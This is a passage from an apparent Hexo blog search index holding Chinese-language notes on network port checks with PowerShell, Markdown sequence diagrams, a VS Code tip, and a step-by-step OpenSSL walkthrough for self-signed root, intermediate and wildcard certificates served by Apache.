href=\"https://dev.to/koh_sh/connectivity-check-with-ansible-1po\" target=\"_blank\" rel=\"noopener\">Connectivity check WITH Ansible - DEV Community 👩‍💻👨‍💻</a><br><a href=\"https://devops.stackexchange.com/questions/1658/ansible-other-option-available-for-telnet-check-of-open-ports\" target=\"_blank\" rel=\"noopener\">testing - Ansible: Other option available for telnet check of open ports? - DevOps Stack Exchange</a><br><a href=\"https://stackoverflow.com/questions/39800368/test-if-a-server-is-reachable-from-host-and-has-port-open-with-ansible\" target=\"_blank\" rel=\"noopener\">Test if a server is reachable from host and has port open with Ansible - Stack Overflow</a><br><a href=\"https://github.com/willthames/ansible-testing/blob/master/test_tcp\" target=\"_blank\" rel=\"noopener\">ansible-testing/test_tcp at master · willthames/ansible-testing</a><br><a href=\"https://github.com/guerzon/ansible-netcat\" target=\"_blank\" rel=\"noopener\">guerzon/ansible-netcat: Ansible proof-of-concept - netcat systemd service</a></p>\n<h2 id=\"Window-不使用-telnet-方法\"><a href=\"#Window-不使用-telnet-方法\" class=\"headerlink\" title=\"Window 不使用 telnet 方法\"></a>Window 不使用 telnet 方法</h2><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#powershell</span></span><br><span class=\"line\">Test-NetConnection -ComputerName “www.google.com” -Port 443</span><br></pre></td></tr></table></figure>\n<p>不知道為什麼我朋友電腦不能使用<code>telnet</code>(有開啟設定)<br>後來發現有這個指令<br><a href=\"https://medium.com/@CarterTsai/%E5%88%A9%E7%94%A8powershell%E7%9A%84test-netconnection%E4%BE%86%E5%8F%96%E4%BB%A3telnet%E4%BE%86%E6%AA%A2%E6%9F%A5%E7%B6%B2%E7%AB%99%E7%9A%84port%E6%9C%89%E6%B2%92%E6%9C%89%E8%A2%AB%E9%96%8B%E5%95%9F-5bc18909ce67\" target=\"_blank\" rel=\"noopener\">利用PowerShell的Test-NetConnection來取代Telnet來檢查網站的Port有沒有被開啟 | by CarterTsai | Medium</a></p>\n<p>多台電腦指令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&apos;192.168.0.101&apos;,&apos;192.168.0.102&apos;,&apos;Computer-012&apos; | Test-NetConnection -Port 135</span><br><span class=\"line\"></span><br><span class=\"line\">Get-Content -Path .\\computers.txt | Test-NetConnection -Port 1</span><br></pre></td></tr></table></figure>\n<p>更多相關:<br><a href=\"https://www.reddit.com/r/PowerShell/comments/ff2x1f/run_testnetconnection_on_multiple_machines_the/\" target=\"_blank\" rel=\"noopener\">Run Test-NetConnection on multiple machines, the best way：PowerShell</a><br><a href=\"https://www.powershellbros.com/test-connection-to-servers-on-several-ports/\" target=\"_blank\" rel=\"noopener\">Test connection to servers on several ports - Powershellbros.com</a></p>\n","categories":["Linux"],"tags":["linux","shell"]},{"title":"用 Markdown 畫循序圖小記","url":"/blog/2019/10/01/%E7%94%A8-Markdown-%E7%95%AB%E5%BE%AA%E5%BA%8F%E5%9C%96%E5%B0%8F%E8%A8%98/","content":"<p>小記我常忘 markdown 循序圖</p>\n<a id=\"more\"></a>\n<p>循序圖</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">战士-&gt;领导: 首长好</span><br><span class=\"line\">Note right of 领导: 首长复杂的内心活动</span><br><span class=\"line\">领导--&gt;战士: 同志们好</span><br><span class=\"line\">战士-&gt;&gt;领导: 为人民服务</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">對象箭頭標識符：</span><br><span class=\"line\">    -&gt;: 表示實線實箭頭 (同步)</span><br><span class=\"line\">    --&gt;: 表示虛線實箭頭 兩個--回復</span><br><span class=\"line\">    -&gt;&gt;: 表示實線虛箭頭(非同步)</span><br><span class=\"line\">    --&gt;&gt;：表示虛線虛箭頭</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://blog.csdn.net/shulianghan/article/details/17927131\" target=\"_blank\" rel=\"noopener\">【UML 建模】UML入门 之 交互图 – 时序图 协作图详解 - 让 学习 成为一种 习惯 ( 韩曙亮 の 技术博客 ) - CSDN博客</a><br><a href=\"https://www.rdtoc.com/tutorial/markdown-js-sequence-tutorial.html\" target=\"_blank\" rel=\"noopener\">Markdown 時序圖/序列圖 - 開發者目錄</a><br><a href=\"https://www.ibm.com/support/knowledgecenter/zh/SS4JE2_7.5.5/com.ibm.xtools.sequence.doc/topics/cmsg_v.html\" target=\"_blank\" rel=\"noopener\">UML 图中的消息</a></p>\n<p><code>--&gt;</code> 程式返回值使用，如上面範例</p>\n","categories":["Markdown"],"tags":["markdown"]},{"title":"清除vscode一個檔不同專案開啟記錄","url":"/blog/2019/03/23/%E6%B8%85%E9%99%A4vscode%E4%B8%80%E5%80%8B%E6%AA%94%E4%B8%8D%E5%90%8C%E5%B0%88%E6%A1%88%E9%96%8B%E5%95%9F%E8%A8%98%E9%8C%84/","content":"<p>最近很常開專案開啟額外不同的檔案<br>有時候找檔案時候就會跳出來<br>所以今天有去搜尋要怎麼清掉<br>如下</p>\n<a id=\"more\"></a>\n<img src=\"/blog/2019/03/23/清除vscode一個檔不同專案開啟記錄/1.jpg\" title=\"F1\">\n<p>喝喝，就是這麼簡單<br>簡單都怕忘掉</p>\n","categories":["vscode"],"tags":["vscode"]},{"title":"產生自簽憑證筆記","url":"/blog/2020/07/18/%E7%94%A2%E7%94%9F%E8%87%AA%E7%B0%BD%E6%86%91%E8%AD%89%E7%AD%86%E8%A8%98/","content":"<p>上次上班花很多時間處理憑證問題<br>為了碰到下次不要花費太多時間<a href=\"https://malagege.github.io/blog/2020/07/14/%E8%A8%AD%E5%82%99%E6%A0%B9%E6%86%91%E8%AD%89%E4%B8%8D%E6%AD%A3%E7%A2%BA%E5%B0%8E%E8%87%B4%E4%B8%8D%E8%83%BD%E6%89%93API%E5%95%8F%E9%A1%8C/\">設備根憑證不正確導致不能打API問題 | 程式狂想筆記</a><br>今天要還債(技術債)了<br>主要試試看建立憑證</p>\n<a id=\"more\"></a>\n<h2 id=\"建立根憑證\"><a href=\"#建立根憑證\" class=\"headerlink\" title=\"建立根憑證\"></a>建立根憑證</h2><p>這邊範例是照<a href=\"https://blog.miniasp.com/post/2019/02/25/Creating-Self-signed-Certificate-using-OpenSSL?fbclid=IwAR3xS1xqkOfLQmK22bDyp9bgOJ71PBNChr-2REMq3oIMT5-0biUTJl41a1k\" target=\"_blank\" rel=\"noopener\">如何使用 OpenSSL 建立開發測試用途的自簽憑證 (Self-Signed Certificate) | The Will Will Web</a><br>可以找個 VM 來測試看環境</p>\n<ol>\n<li>安裝 openssl</li>\n</ol>\n<p>ubuntu 預設就會安裝</p>\n<ol start=\"2\">\n<li>設定 conf </li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[req]</span><br><span class=\"line\">prompt = no</span><br><span class=\"line\">default_md = sha256</span><br><span class=\"line\">default_bits = 2048</span><br><span class=\"line\">distinguished_name = dn</span><br><span class=\"line\">x509_extensions = v3_req</span><br><span class=\"line\"></span><br><span class=\"line\">[dn]</span><br><span class=\"line\">C = TW</span><br><span class=\"line\">ST = Taiwan</span><br><span class=\"line\">L = Taipei</span><br><span class=\"line\">O = Duotify Inc.</span><br><span class=\"line\">OU = IT Department</span><br><span class=\"line\">emailAddress = admin@example.com</span><br><span class=\"line\">CN = localhost</span><br><span class=\"line\"></span><br><span class=\"line\">[v3_req]</span><br><span class=\"line\">subjectAltName = @alt_names</span><br><span class=\"line\"></span><br><span class=\"line\">[alt_names]</span><br><span class=\"line\">DNS.1 = *.localhost</span><br><span class=\"line\">DNS.2 = localhost</span><br><span class=\"line\">IP.1 = 192.168.2.100</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>產生私鑰、公鑰</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl req -x509 -new -nodes -sha256 -utf8 -days 3650 -newkey rsa:2048 -keyout server.key -out server.crt -config ssl.conf</span><br></pre></td></tr></table></figure>\n<ol start=\"4\">\n<li>丟到系統憑證區</li>\n</ol>\n<p>Ubuntu </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo cp server.crt /usr/<span class=\"built_in\">local</span>/share/ca-certificates/</span><br><span class=\"line\">sudo update-ca-certificates</span><br></pre></td></tr></table></figure>\n<ol start=\"5\">\n<li>測試結果<br>沒錯，就這麼簡單<br>可以找一個隨便 Web Server 建立</li>\n</ol>\n<p>這邊我用的是 Apache 安裝<br>這邊小卡了一下，因為我是第一次設定XD</p>\n<p>啟用 ssl 模組<br>a2enmod ssl<br>啟用 ssl 虛擬站台<br>a2ensite default-ssl<br>重啟 apache<br>sudo service apache2 restart<br>修改憑證路徑(private.key,public.crt/pem)<br>vim /etc/apache2/sites-enabled/default-ssl.conf </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">SSLCertificateFile      /home/vagrant/server.crt</span><br><span class=\"line\">SSLCertificateKeyFile /home/vagrant/server.key</span><br></pre></td></tr></table></figure>\n<p>就可以測試結果了</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl https://localhost</span><br><span class=\"line\"><span class=\"comment\"># ok</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"\"</span>|openssl s_client  -connect localhost:443 2&gt;&amp;1  | less</span><br><span class=\"line\"><span class=\"comment\"># 會有Can't use SSL_get_servername</span></span><br><span class=\"line\"><span class=\"comment\"># 不過還是過了，verify return:1 </span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"\"</span>|openssl s_client -servername localhost -connect localhost:443 2&gt;&amp;1  | less</span><br><span class=\"line\"><span class=\"comment\"># 就不會有這個問題 Can't use SSL_get_servername</span></span><br></pre></td></tr></table></figure>\n<p>相關教學</p>\n<p><a href=\"https://www.ichiayi.com/wiki/tech/openssl_caserver\" target=\"_blank\" rel=\"noopener\">OpenSSL 簽發憑證方式 [蔡宗融個人網站]</a><br>使用這個做，會有<code>[Sat Jul 18 11:12:43.084807 2020] [ssl:emerg] [pid 27557:tid 140210043268160] SSL Library Error: error:140AB18E:SSL routines:SSL_CTX_use_certificate:ca md too weak\nAH00016: Configuration Failed</code><br>後來參考:<a href=\"http://blog.itist.tw/2014/06/openssl.html\" target=\"_blank\" rel=\"noopener\">Raspberry Pi 的實作 - 產生一張自己核發的 SSL 憑證 | IT 技術家</a><br>使用1024會有ee key too small<br><a href=\"https://www.cnblogs.com/stronger-xsw/p/12760904.html\" target=\"_blank\" rel=\"noopener\">nginx:SSL: error:140AB18F:SSL routines:SSL_CTX_use_certificate:ee key too small - 八戒vs - 博客园</a><br>改成 2048 就可以</p>\n<p>原本我根憑證想簽下面憑證，產生出來設定在Apache<br>竟然都失敗了<br>這時候我突然想到，每一張都可以簽，不就沒有管理機制?</p>\n<blockquote>\n<p>其他欄位比較重要的是basic constraints的CA:true和key usage的key cert sign，表示這個憑證可以再往下簽（總不可能讓它無限簽吧）。<br>參考來源:<a href=\"http://qbsuranalang.blogspot.com/2017/05/openssl-certificate-chain-included-san.html\" target=\"_blank\" rel=\"noopener\">TU的雜七雜八筆記本: OpenSSL Certificate Chain (included SAN)</a></p>\n</blockquote>\n<p><a href=\"https://blog.toright.com/posts/4024/haproxy-%E6%95%B4%E5%90%88-ssltls-client-certificate-%E6%95%99%E5%AD%B8.html\" target=\"_blank\" rel=\"noopener\">HAProxy 整合 SSL/TLS Client Certificate 教學 - Soul &amp; Shell Blog</a><br>這邊沒有提到CA:true</p>\n<p>回頭看我產出來的<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl x509 -noout -text -<span class=\"keyword\">in</span> server.crt</span><br></pre></td></tr></table></figure></p>\n<p>真的沒有CA:true</p>\n<p>我 Google 到這篇<a href=\"https://blog.davy.tw/posts/use-openssl-to-sign-intermediate-ca/\" target=\"_blank\" rel=\"noopener\">如何使用 OpenSSL 簽發中介 CA</a><br>照他的產生 Root CA 步驟結果有看到 CA:true<br>估計是保哥使用<code>x509_extensions = v3_req</code>關係<br>所以沒有開到 CA:true</p>\n<h2 id=\"產生中繼憑證\"><a href=\"#產生中繼憑證\" class=\"headerlink\" title=\"產生中繼憑證\"></a>產生中繼憑證</h2><h3 id=\"產生授權根憑證\"><a href=\"#產生授權根憑證\" class=\"headerlink\" title=\"產生授權根憑證\"></a>產生授權根憑證</h3><p><a href=\"https://blog.davy.tw/posts/use-openssl-to-sign-intermediate-ca/\" target=\"_blank\" rel=\"noopener\">如何使用 OpenSSL 簽發中介 CA</a><a href=\"/blog/2020/07/18/產生自簽憑證筆記/web2.png\" title=\"備份圖\">備份圖</a></p>\n<blockquote>\n<p>建立 Key 應該是整個環節中最簡單的步驟了，利用簡單的 openssl genrsa 即可，這邊採用 AES256 加密 Key 並將長度設為 4096（如果你不想要加上密碼，就不要下 -aes256，但你的 Key 就少了一層保護）：</p>\n</blockquote>\n<p>我不想打密碼就拿掉了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl genrsa  -out ca.key 4096</span><br></pre></td></tr></table></figure>\n<p>相關資訊打完(備註: CN 我打 localhost)<br>複製到系統安全憑證區</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo cp ca.pem /usr/<span class=\"built_in\">local</span>/share/ca-certificates/ca.srt  <span class=\"comment\"># 這邊要改成srt</span></span><br><span class=\"line\">sudo update-ca-certificates</span><br></pre></td></tr></table></figure>\n<p>openssl x509 -noout -text -in ca.pem<br>確實有看到 CA: true<br>先到 Apache 測試 <a href=\"https://localhost\" target=\"_blank\" rel=\"noopener\">https://localhost</a><br>curl 成功</p>\n<h3 id=\"產生中繼憑證-1\"><a href=\"#產生中繼憑證-1\" class=\"headerlink\" title=\"產生中繼憑證\"></a>產生中繼憑證</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl genrsa  -out intermediate.key 4096</span><br></pre></td></tr></table></figure>\n<p>一樣我AES256拿掉<br><del>我就是不想打密碼，我就爛XD</del></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#CN 我設定 a.localhost 網域</span></span><br><span class=\"line\">openssl req -sha256 -new -key intermediate.key -out intermediate.csr</span><br><span class=\"line\">vim intermediate.ext</span><br></pre></td></tr></table></figure>\n<p>intermediate.ext內容貼上去<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[ intermediate_ca ]</span><br><span class=\"line\">subjectKeyIdentifier = hash</span><br><span class=\"line\">authorityKeyIdentifier = keyid:always,issuer</span><br><span class=\"line\">basicConstraints = CA:true, pathlen:0</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>為什麼要自己定義呢？ 用原本的 v3_ca 不好嗎？<br>當然，如果你想要讓這個 CA 跟 Root CA 一樣可以繼續往下簽 Intermediate CA 的話，那你可以選擇繼續使用 v3_ca。<br>上面定義的 intermediate_ca 相較預設的 v3_ca 多了一個 pathlen:0，表示他往下還可以有 0 個 Intermediate CA（也就是沒有的意思）。</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl x509 -req -in intermediate.csr \\</span><br><span class=\"line\">               -CA ca.pem -CAkey ca.key \\</span><br><span class=\"line\">               -CAserial ca.serial -CAcreateserial \\</span><br><span class=\"line\">               -days 730 \\</span><br><span class=\"line\">               -extensions intermediate_ca -extfile intermediate.ext \\</span><br><span class=\"line\">               -out intermediate.pem</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>其中有幾個選項需要介紹一下：</p>\n<p>   -CAserial ca.serial： 每個 CA 簽發憑證時都需要一個流水號，這裡是指出流水號記錄檔檔名<br>   <strong>-CAcreateserial： 只有當 CA 初次簽發時需要，他會初始化一個流水號出來，第二次之後簽發就不要帶這個參數，以免流水號被重置</strong><br>   -extensions intermediate_ca： 我們想要指定剛剛我們建立的 extension<br>   -extfile intermediate.ext： 需要指定包含 extension 的設定檔</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查看中繼憑證</span></span><br><span class=\"line\">openssl x509 -noout -text -<span class=\"keyword\">in</span> intermediate.pem</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>可以看到 Issuer 是我們 Root CA 的名稱，而 Subject 是 CSR 中填寫的內容。<br>並且有將 pathlen 設為 0，表示這個 CA 只能用來簽發終端憑證。</p>\n</blockquote>\n<blockquote>\n<p>另外，我們還可以透過 openssl verify 驗證這個憑證是不是由 Root CA 一路發下來的。</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl verify -CAfile ca.pem intermediate.pem</span><br><span class=\"line\"><span class=\"comment\"># intermediate.pem: OK</span></span><br></pre></td></tr></table></figure>\n<p>一樣我把中繼憑證複製到 Apache 測試 <a href=\"https://a.localhost\" target=\"_blank\" rel=\"noopener\">https://a.localhost</a> OK(更換憑證設定我就不寫了)</p>\n<h3 id=\"產生終端憑證\"><a href=\"#產生終端憑證\" class=\"headerlink\" title=\"產生終端憑證\"></a>產生終端憑證</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -aes256 拿掉，不解釋</span></span><br><span class=\"line\">openssl genrsa  -out endentity.key 4096</span><br><span class=\"line\"><span class=\"comment\"># 這次我 CN = a.a.localhost</span></span><br><span class=\"line\">openssl req -sha256 -new -key endentity.key -out endentity.csr</span><br><span class=\"line\"><span class=\"comment\"># 中繼憑證簽發終端憑證</span></span><br><span class=\"line\">openssl x509 -req -<span class=\"keyword\">in</span> endentity.csr \\</span><br><span class=\"line\">               -CA intermediate.pem -CAkey intermediate.key \\</span><br><span class=\"line\">               -CAserial intermediate.serial -CAcreateserial \\</span><br><span class=\"line\">               -days 365 \\</span><br><span class=\"line\">               -out endentity.pem</span><br><span class=\"line\"><span class=\"comment\"># 查看憑證</span></span><br><span class=\"line\">openssl x509 -noout -text -<span class=\"keyword\">in</span> endentity.pem</span><br><span class=\"line\"><span class=\"comment\"># 檢查憑證鍊</span></span><br><span class=\"line\">openssl verify -CAfile ca.pem -untrusted intermediate.pem endentity.pem</span><br></pre></td></tr></table></figure>\n<p>這邊因為有 Apache/nginx 中繼憑證<br>所以在設定上會不太一樣<br>Apache 有特別設定方法，這邊就不仔細說原因了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">SSLCertificateFile      /home/vagrant/test/endentity.pem</span><br><span class=\"line\">SSLCertificateKeyFile /home/vagrant/test/endentity.key</span><br><span class=\"line\">SSLCertificateChainFile /home/vagrant/test/intermediate.pem</span><br></pre></td></tr></table></figure>\n<p>Nginx/Apache 都可以把中繼憑證包在一起</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># cat endentity.pem &gt; web.crt</span></span><br><span class=\"line\"><span class=\"comment\"># cat intermediate.pem &gt;&gt; web.crt</span></span><br><span class=\"line\">cat endentity.pem intermediate.pem &gt; web.crt</span><br></pre></td></tr></table></figure>\n<p>Apache 設定<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">SSLCertificateFile      /home/vagrant/test/web.crt</span><br><span class=\"line\">SSLCertificateKeyFile /home/vagrant/test/endentity.key</span><br><span class=\"line\">#SSLCertificateChainFile /home/vagrant/test/intermediate.pem</span><br></pre></td></tr></table></figure></p>\n<p>curl <a href=\"https://a.a.localhost/\" target=\"_blank\" rel=\"noopener\">https://a.a.localhost/</a> 顯示正常</p>\n<h2 id=\"wildcard\"><a href=\"#wildcard\" class=\"headerlink\" title=\"wildcard\"></a>wildcard</h2><p>以下教學使用<a href=\"https://blog.darkthread.net/blog/issue-wildcard-ssl-cert-with-openssl/\" target=\"_blank\" rel=\"noopener\">使用 OpenSSL 製作萬用字元 SSL 憑證-黑暗執行緒</a></p>\n<blockquote>\n<p>2017 年 Chrome 58 / Firefox 48 開始要求憑證必須改用 SubjectAltName 欄位提供主機名稱 ，否則將顯示為不安全</p>\n</blockquote>\n<p>========= 犯錯區 Start =========</p>\n<p><strong>這邊修改 *.localhost,*.*.localhost,*.*.*.localhost 網域</strong></p>\n<p>這邊後續我有繼續做，一直失敗，差點要放棄<br>過程是這樣的</p>\n<ol>\n<li>我把localhost-ext.cnf 把 *.localhost 單獨一個<br>結果失敗了</li>\n<li>我把 SNA 只留 *.localhost<br>還是失敗了</li>\n<li>我把 SNA 放 *.localhost, localhost<br>也是失敗了</li>\n<li><p>我把 Apache conf 設定家 Servername localhost Serveralias localhost *.localhost<br>還是失敗了</p>\n</li>\n<li><p>…<br><a href=\"https://www.devside.net/wamp-server/generating-and-installing-wildcard-and-multi-domain-ssl-certificates\" target=\"_blank\" rel=\"noopener\">Generating and Installing Wildcard and Multi-Domain SSL Certificates | DeveloperSide.NET</a></p>\n</li>\n</ol>\n<p>openssl verify -CAfile ca.pem -untrusted intermediate.pem localhost.crt<br>這一段沒有錯，但還是跑出這個錯誤<br>curl -v <a href=\"https://a.a.localhost\" target=\"_blank\" rel=\"noopener\">https://a.a.localhost</a></p>\n<ul>\n<li>subjectAltName does not match a.a.localhost</li>\n<li>SSL: no alternative certificate subject name matches target host name ‘a.a.localhost’<br>跟別的網站不一樣</li>\n<li>subjectAltName: host “xxx.xxxxx.com.tw” matched cert’s “*.xxxxx.com.tw”</li>\n</ul>\n<p>apache error log<br>AH01909: 127.0.1.1:443:0 server certificate does NOT include an ID which matches the server name</p>\n<blockquote>\n<p> 後來求助偉大的谷歌，發現原來是nginx的TLS SNI support功能沒開，SNI （服務器名字指示）不開啟的話，一個IP只支持一個SSL證書，不支持多個證書，而服務器是yum安裝的nginx，默認TLS SNI support是關閉的，重新編譯nginx並指定openssl庫後，TLS SNI support 開啟了，訪問就正常了<br><a href=\"https://blog.51cto.com/czwanga/1925013\" target=\"_blank\" rel=\"noopener\">記錄一次升級https走過的坑-czwanga-51CTO博客</a></p>\n</blockquote>\n<p>…<br>….<br>…..</p>\n<p><del>總之努力不一定會成功，不努力就一定很輕鬆</del><br><del>各位 Bye</del><br>剛好最近看到<a href=\"https://www.youtube.com/watch?v=AlOO2yb4q2M&amp;feature=youtu.be&amp;t=236\" target=\"_blank\" rel=\"noopener\">【Fun科學】靈壓探測器(潛伏身邊的不明危機！) - YouTube</a></p>\n<p>為了不浪費大家的時間，我最後解決了，整理一下發生了什麼原因</p>\n<p><del>這邊修改 *.localhost,*.*.localhost,*.*.*.localhost 網域</del><br>這邊我犯了很嚴重錯誤<br>這邊萬用網域也不是可以隨便用網址<br>需要使用<strong>一級網域</strong>做萬用憑證 EX:*.localhost.com  &lt;==== 這邊<strong>一級網域</strong>應該是指 萬用憑證 不是只 SNA<br>萬用憑證也只能用一層，所以*.*.localhost.com,*.*.*.localhost.com (應該不行，我沒有實驗)<br>正確來說 現在萬用憑證不看 CN 了，現在瀏覽器都會看 SNA 是否正確<br>SNA 算是 憑證 x509 插件<br>有實驗 *.a.localhost.com 是可以跑了</p>\n<p>因為 localhost.com 網域 DNS 會抓不到<br>所以我們先手動設定 /etc/hosts 設定 127.0.0.1  localhost.com<br>家如要新增 a.localhost.com 也要獨立新增 127.0.0.1 a.localhost.com<br>SNA 也能設定 *.a.localhost.com ，沒有一級網域限制</p>\n<p>以上是我實驗結果</p>\n<p>參考資料</p>\n<ul>\n<li><a href=\"http://liaoph.com/openssl-san/\" target=\"_blank\" rel=\"noopener\">OpenSSL SAN 证书 - Fantasy</a><br>這邊裡面有介紹 SNA</li>\n</ul>\n<blockquote>\n<p>萬用字元憑證只能覆蓋一級子域<br><a href=\"https://zh.wikipedia.org/wiki/%E9%80%9A%E9%85%8D%E7%AC%A6%E8%AF%81%E4%B9%A6\" target=\"_blank\" rel=\"noopener\">萬用字元憑證 - 維基百科，自由的百科全書</a></p>\n</blockquote>\n<blockquote>\n<p>   Wildcard Domains: Wildcard domains such as <em>.example.com are useful when protecting multiple services on one domain such as <a href=\"http://www.example.com\" target=\"_blank\" rel=\"noopener\">www.example.com</a>, mail.example.com, mx.example.com, ftp.example.com, blog.example.com, etc. however it has several limitations:<br>       Non-zero length subdomain: first is that many sites will use a combination of <a href=\"http://www.example.com\" target=\"_blank\" rel=\"noopener\">www.example.com</a> and example.com and a </em>.example.com wildcard will not match the latter.<br>       Only flat subdomain support: wildcards will not support multiple subdomains, for example <em>.m.example.com will not be matched by </em>.example.com.<br>       Only one domain: finally, *.example.com will not support an entirely different subdomain such as foobar.com<br>   Subject Alternative Name: Using the X.509 subjectAltName extension has been useful to address some of the limiations of wildcard domains, namely they can contain multiple FQDNs of all types so names with differing numbers of subdomains and entirely different domains can be suppored. To make SANs even more useful, the goal of this effort was to validate the support for using wildcard domain names in the SAN.<br>參考來源:<a href=\"https://grokify.github.io/security/wildcard-subject-alternative-name-ssl-tls-certificates/\" target=\"_blank\" rel=\"noopener\">Wildcard Subject Alternate Name SSL/TLS Certificates</a></p>\n</blockquote>\n<p>========= 犯錯區 End =========</p>\n<p>這邊拿剛剛上面中繼憑證繼續用</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 建立私鑰</span></span><br><span class=\"line\">openssl genrsa -out localhost.key 2048</span><br><span class=\"line\"><span class=\"comment\"># 設定 localhost.cnf</span></span><br><span class=\"line\">vim localhost.cnf</span><br></pre></td></tr></table></figure>\n<p>localhost.cnf<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[req]</span><br><span class=\"line\">default_bits = 2048</span><br><span class=\"line\">prompt = no</span><br><span class=\"line\">default_md = sha256</span><br><span class=\"line\">distinguished_name = dn</span><br><span class=\"line\"></span><br><span class=\"line\">[dn]</span><br><span class=\"line\">C=TW</span><br><span class=\"line\">ST=Taiwan</span><br><span class=\"line\">L=Taipei</span><br><span class=\"line\">O=localhost</span><br><span class=\"line\">OU=localhost CA</span><br><span class=\"line\">emailAddress=nobody@localhost</span><br><span class=\"line\">CN=*.localhost.com</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 產出 CSR</span></span><br><span class=\"line\">openssl req -new -sha256 -nodes -key localhost.key -out localhost.csr -config localhost.cnf</span><br><span class=\"line\"></span><br><span class=\"line\">vim localhost-v3.cnf</span><br></pre></td></tr></table></figure>\n<p>localhost-v3.cnf<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">keyUsage                = critical,digitalSignature,keyEncipherment</span><br><span class=\"line\">extendedKeyUsage        = serverAuth,clientAuth</span><br><span class=\"line\">subjectKeyIdentifier    = hash</span><br><span class=\"line\">basicConstraints=CA:FALSE</span><br><span class=\"line\">subjectAltName = @alt_names</span><br><span class=\"line\"></span><br><span class=\"line\">[alt_names]</span><br><span class=\"line\">DNS.1 = *.localhost.com</span><br><span class=\"line\">DNS.2 = localhost.com</span><br><span class=\"line\">DNS.3 = *.a.localhost.com</span><br></pre></td></tr></table></figure></p>\n<p>這邊因為中途失敗一直嘗試更改，所以跟darkthread-net-v3.ext 不太一樣</p>\n<blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt; authorityKeyIdentifier=keyid,issuer</span><br><span class=\"line\">&gt; basicConstraints=CA:FALSE</span><br><span class=\"line\">&gt; keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment</span><br><span class=\"line\">&gt; subjectAltName = @alt_names</span><br><span class=\"line\">&gt; </span><br><span class=\"line\">&gt; [alt_names]</span><br><span class=\"line\">&gt; DNS.1 = *.darkthread.net</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#  拿掉 -CAcreateserial</span></span><br><span class=\"line\"><span class=\"comment\">#  -CAserial intermediate.serial 需要指定序號，後面參數指的是序號檔名</span></span><br><span class=\"line\">openssl x509 -req -<span class=\"keyword\">in</span> localhost.csr -CA intermediate.pem -CAkey intermediate.key  -out localhost.crt -days 365 -sha256 -CAserial intermediate.serial -extfile localhost-v3.ext</span><br></pre></td></tr></table></figure>\n<p>基本上放在 Apache 之前設定跟之前差不多<br>我就不說了</p>\n<p><a href=\"https://a.localhost.com\" target=\"_blank\" rel=\"noopener\">https://a.localhost.com</a><br><a href=\"https://a.a.localhost.com\" target=\"_blank\" rel=\"noopener\">https://a.a.localhost.com</a></p>\n<p>curl 都可以順利跑</p>\n<h2 id=\"TWCA-憑證為什麼有三層，四層串到同一個憑證呢\"><a href=\"#TWCA-憑證為什麼有三層，四層串到同一個憑證呢\" class=\"headerlink\" title=\"TWCA 憑證為什麼有三層，四層串到同一個憑證呢?\"></a>TWCA 憑證為什麼有三層，四層串到同一個憑證呢?</h2><p>我目前猜想其中兩邊憑證都是吃同一把私鑰<br>產生兩組 crt(public key)<br>所以憑證都可以用</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl x509 -req -<span class=\"keyword\">in</span> intermediate.csr \\</span><br><span class=\"line\">               -CA ca.pem -CAkey ca.key \\</span><br><span class=\"line\">               -CAserial ca.serial \\</span><br><span class=\"line\">               -days 730 \\</span><br><span class=\"line\">               -extensions intermediate_ca -extfile intermediate.ext \\</span><br><span class=\"line\">               -out 